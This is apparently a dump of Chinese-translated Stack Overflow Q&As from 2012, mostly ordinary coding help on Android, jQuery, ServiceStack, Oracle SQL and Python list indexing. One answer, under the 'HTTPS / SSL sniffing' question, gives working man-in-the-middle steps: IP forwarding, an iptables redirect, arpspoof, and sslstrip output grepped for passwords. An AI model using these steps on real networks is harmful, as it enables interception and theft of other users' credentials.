另外，首先检查您要查找的号码是否不在节点本身上，而不是先搜索每个分支。只需切换 if 的顺序。

# android - 每 100 毫秒执行一次操作，持续 1000 毫秒

> ID：11847462
> 
> 赞同：-3
> 
> 时间：2012-08-07T13:49:22.367
> 
> 标签：android

我想每 100 毫秒执行一次操作，持续 1000 毫秒。

我相信我需要使用

```
handler 
```

我怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:52:46.203

```
Handler h = new Handler();
int count = 0;
int delay = 100;//milli seconds
long now = 0;

h.postDelayed(new Runnable(){

    public void run(){
        now = System.currentTimeMillis();
        //do something

        if(10>count++)
        h.postAtTime(this, now + delay);
    },
delay}; 
```

请注意，您的操作必须少于 100 毫秒才能执行，否则将无法每 100 毫秒运行一次，所有方法都是这种情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:53:00.930

```
Timer t = new Timer();
int count = 0;
t.scheduleAtFixedRate(new TimerTask() {
    count++;
    // Do stuff
    if (count >= 10)
        t.cancel();
}, 0, 100); 
```

这会安排一个计时器来执行 a `TimerTask`，延迟为 0 毫秒。它将`TimerTask`每 100 毫秒执行一次主体。用于`count`跟踪您在任务中的位置，在 10 次迭代后，您可以取消计时器。

正如@Jug6ernaut 提到的，确保您的任务不会花费很长时间来执行。冗长的任务（在您的情况下花费超过 100 毫秒的任务）将导致滞后/潜在的不良结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:10:11.523

我现在没有时间测试这个，但这应该可以

这是一种方式：

*   您想从这里调用的方法可能需要是静态的
*   这个类可以嵌套在另一个类中
*   您可以使用 % （模数），以便计时器可以继续计数，并且您可以设置以更多间隔发生的事情

创建这个计时器：

```
private Timer mTimer = new Timer(); 
```

启动这个计时器：

```
mTimer.scheduleAtFixedRate(new MyTask(), 0, 100L); 
```

计时器类：

```
 /**
     * Nested timer to call the task
     */
    private class MyTask extends TimerTask {
        @Override
        public void run() {
            try {
                counter++;
                //call your method that you want to do every 100ms
                            if (counter == 10) {
                               counter = 0;
                               //call method you wanted every 1000ms
                            }
                Thread.sleep(100);
            } catch (Throwable t) { 
                //handle this  - maybe by starting it back up again            
            }
        }       
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:52:31.880

您可以使用[`Timer`](http://developer.android.com/reference/java/util/Timer.html).

# android - 找到 APK 的重复文件：lib/armeabi-v7a/gdbserver

> ID：11847464
> 
> 赞同：3
> 
> 时间：2012-08-07T13:49:31.483
> 
> 标签：android, java-native-interface, gdbserver

我在android上有两个jni项目。我想使用其中之一来开发项目。其中一个项目调用另一个项目的方法。编译程序时我没有收到任何错误。但是，当我尝试运行该程序时，出现此错误：

```
Origin 1: /home/devuser/Desktop/workspaceJava/arTTClientDeveloperProject/libs/armeabi-v7a/gdbserver
Origin 2: /home/devuser/Desktop/workspaceJava/ARTTClientMobileAPI/libs/armeabi-v7a/gdbserver
[2012-08-07 16:10:49 - arTTClientDeveloperProject] Error generating final archive: Found duplicate file for APK: lib/armeabi-v7a/gdbserver 
```

你对这种情况有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-21T12:38:59.740

我刚刚遇到了这个问题，因为我在构建两个库时都定义了 NDK_DEBUG=1。这应该只是我认为的最高水平。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T10:41:44.183

您已在项目的 2 个位置添加了 .jar。在 libs 文件夹中并使用“添加外部 jar”添加。删除一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-31T06:36:34.727

在 Gradle 中添加以下内容

```
packagingOptions {
    exclude "lib/armeabi-v7a/gdbserver"
} 
```

# javascript - 对 Google Maps v3 API getDetails() 函数感到困惑

> ID：11847467
> 
> 赞同：2
> 
> 时间：2012-08-07T13:49:46.813
> 
> 标签：javascript, google-maps, google-maps-api-3, google-maps-markers, google-places-api

我正在编写一个应用程序，用于使用 Google Maps & Places API 查找附近的餐厅和其他景点。我正在使用谷歌地方搜索功能来帮助获取信息

```
var service = new google.maps.places.PlacesService(map);
service.search(request, callback); 
```

但后来我意识到它不会返回我需要的值，比如我使用搜索创建的标记的格式化地址。现在我感到困惑的是要获得使用该`getDetails()`功能所需的额外信息。这应该替换我上面使用的搜索功能还是应该在此之后放置一段时间？当谷歌在他们的网站上描述它时，它看起来应该只是替换搜索功能，因为在示例中它采用相同的确切参数并且运行与搜索功能相同但是如果我这样做，那么它根本不会返回任何地方。这是我的一些代码，可帮助解释我要完成的工作。

```
 //Function for finding destination types. Receives destination type as a string.
function findDestinationType(where)
{
    request = null;
    var request = 
    {
        location: point,
        radius: 2500,
        types: [where]
    };

    var service = new google.maps.places.PlacesService(map);
    service.getDetails(request, callback);
}
//Call Back to fill array with markers & locations 
function callback(results, status) 
{
    if (status == google.maps.places.PlacesServiceStatus.OK) 
    {
        initialize();
        iterator = 0;
        markerArr = [];
        for (var i = 0; i < results.length; i++) 
        {
            markerArr.push(results[i].geometry.location);
            result = results[i];
            createMarker(results[i]);
        }
    }
    else
    {
        alert("Sorry, there are no locations in your area");
    }
}
//Function to create marker
function createMarker(place)
{
    var marker = new google.maps.Marker(
    {
        position: markerArr[iterator],
        map: map,
        draggable: false,
        animation: google.maps.Animation.DROP
    })
    //alert(markerArr[iterator]);
    markersA.push(marker);
    iterator++;
    google.maps.event.addListener(marker, 'click', function()
    {
        console.log('clicked');
        infowindow.setContent(place.name);
        infowindow.open(map, this);
        //directionsDisplay.setMap(map);
    });
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T18:22:52.533

Your assumption is wrong, getDetails() expects not the same parameters, it expects a **reference** to a place.

The **reference** you will get as a result for a places-search, it's a token.

So the workflow is when you search for a place:

1.  use `places.search()` for basic informations about the place
2.  when you need more informations use `places.getDetails()` with the reference from step 1\. as argument

# windows-runtime - windows 8 启动 Metro 风格应用程序的默认媒体播放器

> ID：11847471
> 
> 赞同：3
> 
> 时间：2012-08-07T13:50:00.163
> 
> 标签：windows-runtime, windows-store-apps

我在网络服务器中托管了一个视频文件 (uri=http://testserver/test.mp4)，我想通过我的 Metro 风格应用程序将文件加载到默认媒体播放器中。我已经尝试过 Windows.System.Launcher.LaunchURIAsyc(uri)，因为使用的协议是 http，所以文件在 IE 中加载。我正在寻找类似于 Wp7 的 MediaPlayerLauncher 的东西

# sniffing - HTTPS / SSL 嗅探

> ID：11847475
> 
> 赞同：1
> 
> 时间：2012-08-07T13:50:15.800
> 
> 标签：sniffing, network-security

我正在为此使用**Backtrack5** ..但被卡住了...我无法获得我想要的数据，我为此使用**Ettercap**和**SSL Strip** ...

这里有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T10:59:53.570

不知道你是怎么做的，但对我来说，ettercap-gtk（gui）一直是垃圾。我建议跳过 ettercap，除非你想要简单的 DNS 欺骗，然后走另一条路。

让我给你一些步骤，首先为这次攻击设置你的 iptables（中间人，amirite）并启用 ip_forward(ing)

回声“1”> /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1337 （可以选择你想发送到的任何端口）

现在成为中间人：这里我们使用 arpspoof： arpspoof -i wlan0（或任何接口）192.168.1.X（X 是网关，通常为 .1 或 .255）

然后使用 SSLStrip，您可以继续使用 ./sslstrip.py -1 1337 -w 文件名（1337 是之前的端口，文件名是您要将数据转储到的任何文件名）

cat 文件名（来自较早）甚至管道 | grep "password" 或任何你正在嗅探的东西，或者你可以转储所有东西。该文件将充满捕获/剥离的 https 数据。

# java - android的未知充气错误

> ID：11847478
> 
> 赞同：1
> 
> 时间：2012-08-07T13:50:30.883
> 
> 标签：java, android

嗨，我的 android 应用程序有问题。问题是当我尝试设置新视图时。

```
 public View getView(int position, View convertView, ViewGroup parent) {
    View v = convertView;
        if (v == null) {
            try{
            LayoutInflater vi = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            v = vi.inflate(R.layout.list, null);
            }
            catch(Exception e){
                String a=e.toString();
            }
        } 
```

在行 v = vi.inflate(R.layout.list, null); 我收到此错误：

```
 android.view.InflateException: Binary XML file line #5: Error inflating class <unknown> 
```

这也是我的 list.xml 文件：

```
 <?xml version="1.0" encoding="utf-8"?>
    <TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="wrap_content" >
    <TableRow
        android:layout_width="fill_parent"
        android:layout_height="15dp"
        android:background="@drawable/bg_seznam" >
        <TextView
            android:id="@+id/item_title"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:paddingLeft="17dp"
            android:textColor="#ffffff"
            android:textSize="20dp"
            android:textStyle="bold"
            android:typeface="serif" >
        </TextView>         
    </TableRow>
    </TableLayout> 
```

那么有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:57:39.443

我试过你的代码，它在我这边运行良好。
也许进行清理会有所帮助：项目->清理->选择您的项目->确定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:53:56.937

尝试替换这行代码

```
v = vi.inflate(R.layout.list, null); 
```

通过这个：

```
v = vi.inflate(R.layout.list, parent, false); 
```

# jquery - 更新类后jQuery单击功能不起作用

> ID：11847480
> 
> 赞同：5
> 
> 时间：2012-08-07T13:50:35.557
> 
> 标签：jquery

一旦我使用 jQuery 更改元素的类，点击功能就不能在新类上工作。

这是我的代码

```
jQuery('.close').on('click', function() {
    jQuery('div').slideUp();
    jQuery(this).addClass('open');
    jQuery(this).removeClass('close');
});

jQuery('.open').on('click', function() {
    jQuery('div').slideDown();
    jQuery(this).addClass('close');
    jQuery(this).removeClass('open');
});​ 
```

你可以在这里试试 - [http://jsfiddle.net/NkG9k/1/](http://jsfiddle.net/NkG9k/1/)

尝试再次单击切换按钮。（它不会滑下 div）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T13:53:19.850

试试这个，应用于`on`文档并使用类过滤器将事件附加到您的按钮。

**[现场演示](http://jsfiddle.net/rajaadil/NkG9k/2/)**

```
jQuery(document).on('click','.close', function() {
    jQuery('div').slideUp();
    jQuery(this).addClass('open');
    jQuery(this).removeClass('close');
});

jQuery(document).on('click','.open', function() {
    jQuery('div').slideDown();
    jQuery(this).addClass('close');
    jQuery(this).removeClass('open');
});​ 
```

您需要在您想要此动态行为的元素的静态父级上委托事件，以便当元素的类更改（从`open`to`close`和 from `close`to `open`）时，事件会根据新更改的类自动绑定在该元素上。

[了解事件委托](http://learn.jquery.com/events/event-delegation/)

> 事件委托允许我们将单个事件侦听器附加到父元素，该事件侦听器将为匹配选择器的所有后代触发，无论这些后代现在存在还是将来添加。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:54:07.567

您已删除触发事件的类。你可以给它一个id并用id而不是class来调用它。

[检查这个](http://jsfiddle.net/NkG9k/9/)

```
 jQuery('#close').toggle( function() {
    jQuery('div').slideUp();
    jQuery(this).addClass('open');
    jQuery(this).removeClass('close');
},function() {
    jQuery('div').slideDown();
    jQuery(this).addClass('close');
    jQuery(this).removeClass('open');
});
<div id="close" class="close">toggle</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:57:17.653

尝试这样的事情：

```
$('.close').bind('click', function() {
 $('div').toggle();
}); 
```

如果您需要动画，可以查看此[链接](http://api.jquery.com/toggle/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:57:44.010

如果你想使用下面的代码。

```
<button class="toggle">toggle</button> 
<div>THIS IS TEXT</div>

jQuery('.toggle').toggle( 
    function() {
        jQuery('div').slideUp();
    },
    function() {
        jQuery('div').slideDown();
    }
); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-07T13:57:15.573

您应该使用实时事件而不是单击，因为在创建元素时实时事件有效

```
jQuery('.close').live('click', function() {
    jQuery('div').slideUp();
    jQuery(this).addClass('open');
    jQuery(this).removeClass('close');
});

jQuery('.open').live('click', function() {
    jQuery('div').slideDown();
    jQuery(this).addClass('close');
    jQuery(this).removeClass('open');
});​ 
```

# eclipse - eclipse 将所有小写字母“l”显示为大写字母“L”；不改变它们只是显示它们。我可以让它停止“帮助”我吗？

> ID：11847483
> 
> 赞同：0
> 
> 时间：2012-08-07T13:50:48.150
> 
> 标签：eclipse

Eclipse 3.7.2 似乎正在“帮助”我将小写“L”与数字一区分开来，方法是将它们显示为大写......同时将它们保留为实际小写。

它不是针对方法名称执行此操作，而是针对方法调用执行此操作。

因此，如果我有一个名为“doPortfolio”的方法，它就不用管它了。当我调用该方法时，它显示为“foo = doPortfoLio”，但是当我控制单击“doPortfoLio”时，我转到“doPortfolio”。

我可以关闭这个有用的行为吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:28:41.377

这很有趣：）

我刚刚对此进行了测试，这似乎对我来说按预期工作：

![在此处输入图像描述](../Images/0b5f2420e2a8ffc2d67d7d05b277e623.png)

似乎不太可能，但是您是否有可能有该方法的两个版本，一个带有小 ie :`doPortfolio`另一个带有大写的 ie : `doPortfoLio`？

据我所知，Eclipse 不应该做你正在经历的事情！

# servicestack - 返回 304 Not Modified with ServiceStack 时防止不需要的标头

> ID：11847484
> 
> 赞同：6
> 
> 时间：2012-08-07T13:50:50.350
> 
> 标签：servicestack, http-status-code-304

使用 ServiceStack，我只想返回**304 Not Modified**如下：

```
HTTP/1.1 304 Not Modified 
```

但是 ServiceStack 添加了许多其他不需要的（使用 304 代码返回 HttpResult）标头，如下所示：

```
HTTP/1.1 304 Not Modified
Content-Length: 0
Content-Type: application/json
Server: Microsoft-HTTPAPI/2.0
X-Powered-By: ServiceStack/3.94 Win32NT/.NET
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type
Date: Tue, 07 Aug 2012 13:39:19 GMT 
```

如何防止其他标头被输出？我用[HttpResult](https://github.com/ServiceStack/ServiceStack/blob/master/src/ServiceStack.Common/Web/HttpResult.cs)尝试了各种方法，注册了一个虚拟内容类型过滤器，但顾名思义，它只控制内容，而不是标题或[此处](https://stackoverflow.com/questions/10040680/servicestack-and-returning-a-stream)列出的其他内容。我还尝试使用 IStreamWriter 和 IHasOptions 实现我自己的 IHttpResult 衍生物，结果相同：ServiceStack 添加了不需要的标头。

谢谢

更新

可以`content-type`使用以下方法删除，但仍然存在一些标题，即`content-length`,`server`和`date`.

```
 public override object OnGet(FaultTypes request)
    {
      var result = new HttpResult
      {
       StatusCode = HttpStatusCode.NotModified,
       StatusDescription = "Not Modified", // Otherwise NotModified written!
      };

      // The following are hacks to remove as much HTTP headers as possible
      result.ResponseFilter = new NotModifiedContentTypeWriter();
      // Removes the content-type header
      base.Request.ResponseContentType = string.Empty;

      return result;
    }

class NotModifiedContentTypeWriter : ServiceStack.ServiceHost.IContentTypeWriter
{
  ServiceStack.ServiceHost.ResponseSerializerDelegate ServiceStack.ServiceHost.IContentTypeWriter.GetResponseSerializer(string contentType)
  {
    return ResponseSerializerDelegate;
  }

  void ServiceStack.ServiceHost.IContentTypeWriter.SerializeToResponse(ServiceStack.ServiceHost.IRequestContext requestContext, object response, ServiceStack.ServiceHost.IHttpResponse httpRes)
  {
  }

  void ServiceStack.ServiceHost.IContentTypeWriter.SerializeToStream(ServiceStack.ServiceHost.IRequestContext requestContext, object response, System.IO.Stream toStream)
  {
  }

  string ServiceStack.ServiceHost.IContentTypeWriter.SerializeToString(ServiceStack.ServiceHost.IRequestContext requestContext, object response)
  {
    return string.Empty;
  }

  public void ResponseSerializerDelegate(ServiceStack.ServiceHost.IRequestContext requestContext, object dto, ServiceStack.ServiceHost.IHttpResponse httpRes)
  {
  }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-07T14:53:52.773

ServiceStack 发出的唯一标头是在`EndpointHostConfig.GlobalResponseHeaders`.

如果您不希望它们发出，请将它们删除，例如：

```
SetConfig(new EndpointHostConfig { 
    GlobalResponseHeaders = new Dictionary<string,string>()
}); 
```

您可以使用 HttpResult 临时添加它们，例如：

```
return new HttpResult(dto) {
    Headers = {
       { "Access-Control-Allow-Origin", "*" },
       { "Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS" } 
       { "Access-Control-Allow-Headers", "Content-Type" }, }
}; 
```

这两个选项在以下位置进行了更详细的解释：[servicestack REST API 和 CORS](https://stackoverflow.com/questions/8211930/servicestack-rest-api-and-cors)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-28T19:49:20.353

实际上你可以在你的 API 中做这样的事情

```
base.Response.StatusCode = (int) HttpStatusCode.NotModified;
base.Response.EndHttpRequestWithNoContent();
return new HttpResult(); 
```

不会返回 ContentType、ContentLength 等

# c - 检测驱动器添加/删除linux

> ID：11847485
> 
> 赞同：0
> 
> 时间：2012-08-07T13:50:53.617
> 
> 标签：c, linux

我一直在尝试查看是否有需要处理的信号，但似乎找不到。我需要能够从 c 代码中检测何时从服务器插入/删除驱动器。

半相关但可能值得提出自己的问题：有没有办法将特定的驱动器插槽映射到设备名称？例如，服务器有 6 个硬盘位置；我可以让位置 1 始终是 /dev/sda 吗？

# designer - 安装 Process Server 时未安装 IBM Process Center

> ID：11847487
> 
> 赞同：1
> 
> 时间：2012-08-07T13:50:59.200
> 
> 标签：designer, business-process-management

我已经安装了 IBM Process Server，但没有安装 Process Center。安装 Process Center 后，我需要下载 Process Designer。但由于某些原因，我无法找到 Process Center。我尝试从响应文件创建配置文件，但失败了。我想在创建流程中心配置文件时，将安装所有工件，如 DB2 数据库等。我不知道如何解释，但如果我的问题被理解，那么请帮忙。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T01:27:47.547

IID 安装介质包含 IBM Process Manager Advanced 服务器运行时的精简版本。此运行时只能创建 Process Server 配置文件。无法创建 Process Center 配置文件。这似乎很奇怪，因为 Process Center 主要用于开发领域。如果您必须使用 IID 的 Process Center，请执行以下步骤：

```
Install IID without any test environment.
Install IBM Process Manager and choose to create a Process Center profile at the time of installation. This is the quickest way to create a fully functional server runtime.
From IID, create a server of type IBM Process Server v7.5\. Point to the directory where IBM Process Manager was installed (C:\IBM\BPM\v7.5 by default). 
```

由 Bibhas Bhattacharya 提供 URL：[http ://blog.webagesolutions.com/archives/447](http://blog.webagesolutions.com/archives/447)

# sql-server - 选择 case 语句出错

> ID：11847489
> 
> 赞同：-1
> 
> 时间：2012-08-07T13:51:08.297
> 
> 标签：sql-server, stored-procedures, oracle11g

如何将此 T-SQL 查询转换为 Oracle？

```
if((select case 
       when (select  top 1 AlertMessage   
             from ims.dbo.alertlist 
             where SystemID=@meter 
             order by TimePeriod desc
            ) like '%NO_COMMUNICATION_Resolved' then 1 
       else 0 end)=1)
begin
     INSERT INTO [ims].[dbo].[alertlist]
          ([SiteID],[ThresholdNumber],[SystemID],
           [AlertMessage],[TimePeriod],[AlertType],[PollID]) 
     VALUES 
          (1,@thresnumber,@meter,@message,getdate(),1,0)
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:35:05.447

正如 Dan Puzey 所指出的，您的问题过于宽泛，需要大量的反复试验。但是，我会尝试通过可能解决您问题的第一部分的方法让您走上正轨。

```
DECLARE v_IsMessageResolved int;

-- This query will retrieve the value of the first row returned by the sub-query, mimicking the TOP 1 of SQL Server, and it will store the value of MessageResolved in a Variable
SELECT
  MessageResolved into v_IsMessageResolved
FROM
  (
  -- This query will return 1 for all the Messages that match the LIKE clause, ordered by TimePeriod in descending order.
  SELECT
    CASE
      WHEN AlertMessage LIKE '%NO_COMMUNICATION_Resolved' THEN 1
      ELSE 0
    END AS MessageResolved
    ,RANK() OVER (ORDER BY TimePeriod DESC) AS MessageRank
  FROM
    ims.alertlist 
  WHERE
    (SystemID = :meter)
  )
WHERE
  (MessageRank = 1)

-- At this point, it will be a matter of checking the value of v_IsMessageResolved and, if it's "1", run the INSERT 
```

请注意，我非常了解 SQL Server，但我从未使用过 Oracle，因此我的解决方案可能并不完美（甚至根本无法运行，因为我没有测试它的环境）。这也意味着您可以像我一样通过简单的搜索找到剩余问题的答案。:)

# xml - UpdateHuntListReq 类型不是预期的。使用 XmlInclude 或 SoapInclude 属性指定静态未知的类型

> ID：11847490
> 
> 赞同：2
> 
> 时间：2012-08-07T13:51:13.410
> 
> 标签：xml, vb.net

我在调用从 Cisco WSDL 文件生成的代码时遇到以下错误，希望有人能发现我哪里出错了。

我已经在这里查看了类似问题的答案，但我显然仍然遗漏了一些东西。

“不期望类型 UpdateHuntListReq。使用 XmlInclude 或 SoapInclude 属性指定静态未知的类型。”

这是我得到错误的地方：

```
 <System.Web.Services.Protocols.SoapDocumentMethodAttribute("CUCM:DB ver=8.0 updateHuntList", _
Use:=System.Web.Services.Description.SoapBindingUse.Literal, _
ParameterStyle:=System.Web.Services.Protocols.SoapParameterStyle.Bare)> _
        Public Function updateHuntList(<System.Xml.Serialization.XmlElementAttribute("updateHuntList", [Namespace]:="http://www.cisco.com/AXL/API/8.0", [Type]:=GetType(NameAndGUIDRequest))> ByVal updateHuntList1 As UpdateHuntListReq) As <System.Xml.Serialization.XmlElementAttribute("updateHuntListResponse", [Namespace]:="http://www.cisco.com/AXL/API/8.0")> StandardResponse
            Dim results() As Object = Me.Invoke("updateHuntList", New Object() {updateHuntList1})
            Return CType(results(0), StandardResponse)
        End Function 
```

这是 UpdateHuntListReq 类的顶部：

```
 <System.SerializableAttribute(), _
System.Xml.Serialization.XmlTypeAttribute([Namespace]:="http://www.cisco.com/AXL/API/8.0"), _
XmlInclude(GetType(NameAndGUIDRequest))> _
Partial Public Class UpdateHuntListReq
        Inherits NameAndGUIDRequest

        Private newNameField As String
        Private descriptionField As String
        Private callManagerGroupNameField As XFkType
        Private routeListEnabledField As String
        Private voiceMailUsageField As String
        Private itemsField() As XCommonMembersExtension

    .... Rest of the class 
```

谢谢你的帮助

麦克风

# python - Python：按索引过滤列表

> ID：11847491
> 
> 赞同：68
> 
> 时间：2012-08-07T13:51:14.423
> 
> 标签：python, list, filter, indexing

在 Python 中，我有一个元素`aList`列表和一个索引列表`myIndices`。有什么方法可以一次检索所有这些项目，`aList`其中的值作为索引`myIndices`？

例子：

```
>>> aList = ['a', 'b', 'c', 'd', 'e', 'f', 'g']
>>> myIndices = [0, 3, 4]
>>> aList.A_FUNCTION(myIndices)
['a', 'd', 'e'] 
```

* * *

## 回答 #1

> 赞同：118
> 
> 时间：2012-08-07T13:52:58.787

我不知道有什么方法可以做到。但是您可以使用[列表理解](http://www.python.org/dev/peps/pep-0202/)：

```
>>> [aList[i] for i in myIndices] 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-07T14:05:17.147

绝对使用列表推导，但这里有一个函数可以做到这一点（没有`list`这样做的方法）。然而，这是不好的使用，`itemgetter`但只是为了知识，我已经发布了这个。

```
>>> from operator import itemgetter
>>> a_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g']
>>> my_indices = [0, 3, 4]
>>> itemgetter(*my_indices)(a_list)
('a', 'd', 'e') 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-09-06T11:48:55.990

列表索引可以在 numpy 中完成。将您的基本列表转换为 numpy 数组，然后应用另一个列表作为索引：

```
>>> from numpy import array
>>> array(aList)[myIndices]
array(['a', 'd', 'e'], 
  dtype='|S1') 
```

如果需要，请在最后转换回列表：

```
>>> from numpy import array
>>> a = array(aList)[myIndices]
>>> list(a)
['a', 'd', 'e'] 
```

在某些情况下，此解决方案可能比列表理解更方便。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2015-07-27T08:55:55.017

你可以使用`map`

```
map(aList.__getitem__, myIndices) 
```

或者`operator.itemgetter`

```
f = operator.itemgetter(*aList)
f(myIndices) 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-01-20T21:15:22.780

如果您不需要同时访问所有元素的列表，而只是希望迭代地使用子列表中的所有项目（或将它们传递给将要使用的东西），那么使用生成器表达式而不是列表推导更有效：

```
(aList[i] for i in myIndices) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-04-04T15:03:13.987

我对这些解决方案不满意，所以我创建了一个`Flexlist`简单地扩展类的`list`类，并允许通过整数、切片或索引列表进行灵活索引：

```
class Flexlist(list):
    def __getitem__(self, keys):
        if isinstance(keys, (int, slice)): return list.__getitem__(self, keys)
        return [self[k] for k in keys] 
```

然后，对于您的示例，您可以将其用于：

```
aList = Flexlist(['a', 'b', 'c', 'd', 'e', 'f', 'g'])
myIndices = [0, 3, 4]
vals = aList[myIndices]

print(vals)  # ['a', 'd', 'e'] 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2020-09-22T14:33:56.933

或者，您可以使用功能方法使用[`map`](https://docs.python.org/3/library/functions.html#map)和[`lambda`](https://docs.python.org/3/tutorial/controlflow.html#lambda-expressions)功能。

```
>>> list(map(lambda i: aList[i], myIndices))
['a', 'd', 'e'] 
```

# svn - 企业架构师和多个项目

> ID：11847492
> 
> 赞同：0
> 
> 时间：2012-08-07T13:51:24.707
> 
> 标签：svn, enterprise-architect

我正在与 EA 和 SVN 合作。团队中的每个成员都对您的机器有所了解。我想在 EA 上配置一些东西，比如 Auto Name 和 Encounters。如何为 SVN 的所有成员配置和保存？并且这个计数器需要通过 SVN 同步。因为，当有人创建一个对象时，需要为每个人增加。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T11:26:45.713

对不起，你不能。EA 不支持这一点。

某些设置可以在项目之间共享。这些要么打包为 MDG 技术，要么作为参考数据导出/导入。但是，自动名称计数器不能以任何一种方式共享 - 原因是它们会不断变化（每次创建元素时计数器都会更新），因此您每次都必须在每个其他项目中导出、分发和重新导入计数器有人创造了一个元素。

版本控制不支持共享共享设置。换句话说，EA 没有这些设置的版本概念。（有一个与 MDG 技术相关的版本标识，但它只是一个标签。）因此，即使您要从一个项目中导出参考数据并将其存储在 Subversion 中，其他建模者的 EA 安装也不会考虑查看用于导入更新的参考数据的 Subversion。

EA 仅使用 Subversion 作为包存储库。每个建模者的项目都是独立的，并且设置是单独的——事实上，不同的建模者不仅可以自由地单独更改他们的项目设置，而且他们还可以选择他们在他们的项目中包含哪些版本控制的包。

您所描述的情况是您希望共享项目本身（及其所有设置），而不仅仅是包。这可以通过两种方式实现：共享 .EAP 文件（适用于小团队）或数据库存储库（迄今为止最好的解决方案）。使用这种部署模型，我总是建议禁用（Subversion）包的版本控制，以支持用户安全/锁和基线。

EA 还支持另一种部署模型，这里可能会指出（但我不这么认为）：复制。使用此模型，一个项目是 Master，其他项目是 Replica，您可以将 Replica 中的所有更改同步回 Master。

但是，这仍然与拥有一个项目不同，并且当您将副本同步回来时，您的不同建模者在不同副本中创建新元素会导致命名冲突。

因此，如果您需要在建模者之间共享自动名称计数器，唯一的方法是设置一个项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T11:10:57.067

您可以将[DBMS](http://www.sparxsystems.com/enterprise_architect_user_guide/projects_and_teams/createopenmodelfileoverview.html)与 Enterprise Architect 一起使用。我使用这个选项大约一年。在这个 DBMS / 数据库中有几个项目。并且每个项目都可以有参考数据和某些标记值/原型等。这些值和设置您可以在外观下设置某些颜色、字体、名称等。

但是，您对 Auto Name and Encounters 的确切含义是什么？请提供包含此信息的链接。

# c# - mvc 将文件保存到站点中的文件夹

> ID：11847493
> 
> 赞同：4
> 
> 时间：2012-08-07T13:51:30.307
> 
> 标签：c#, asp.net-mvc, file-upload

我正在尝试将文件保存到我网站的文件夹中，但我不断收到 UnauthorizedAccessException 错误。

```
 [HttpPost]
    public ActionResult Edit(Product product, HttpPostedFileBase image)
    {
        var img = Path.GetFileName(image.FileName);

        if (ModelState.IsValid)
        {
            if (image != null && image.ContentLength > 0)
            {
                var path = Path.Combine(Server.MapPath("~/Content/productImages/"),
                                        System.IO.Path.GetFileName(image.FileName));
                image.SaveAs(path);
                product.ImageName = img;

            }

            // save the product
            repository.SaveProduct(product);
            // add a message to the viewbag
            TempData["message"] = string.Format("{0} has been saved", product.Name);
            // return the user to the list
            return RedirectToAction("Index");
        }
        else
        {
            // there is something wrong with the data values
            return View(product);
        }
    } 
```

**这是视图**

```
@using (Html.BeginForm("Edit", "Admin", FormMethod.Post, 
    new { enctype = "multipart/form-data" })) {

    @Html.EditorForModel()

    <div class="editor-label">Image</div>
    <div class="editor-field">
        @if (Model.ImageName == null) {
            @:None
        } else {
            <img width="150" height="150" 
                src="@Url.Action("GetImage", "Product", new { Model.ProductID })" />
        }
        <div>Upload new image: <input type="file" name="image" id="image"/></div>
    </div>

    <input type="submit" value="Save" />
    @Html.ActionLink("Cancel and return to List", "Index")
} 
```

我在**image.SaveAs(path);上收到错误。**线

我看不出我到底做错了什么。有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:53:34.750

好像是权限问题

更改`productImages`文件夹的权限，以便 ASP.NET 可以写入该文件夹。

# python - 蟒蛇网页浏览器

> ID：11847497
> 
> 赞同：5
> 
> 时间：2012-08-07T13:51:39.653
> 
> 标签：python, python-webbrowser

我一直在使用这个模块没有问题，将其称为：

```
webbrowser.open("http link...") 
```

但是，现在我想选择一个不同的浏览器，并根据文档（http://docs.python.org/library/webbrowser.html#webbrowser.get）我写了这个

```
controller = webbrowser.get('firefox')
controller("http link...") 
```

...我得到一个我无法摆脱的错误：

```
Exception in Tkinter callback
Traceback (most recent call last):
....
TypeError: 'Mozilla' object is not callable 
```

有什么想法吗？？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T13:54:33.410

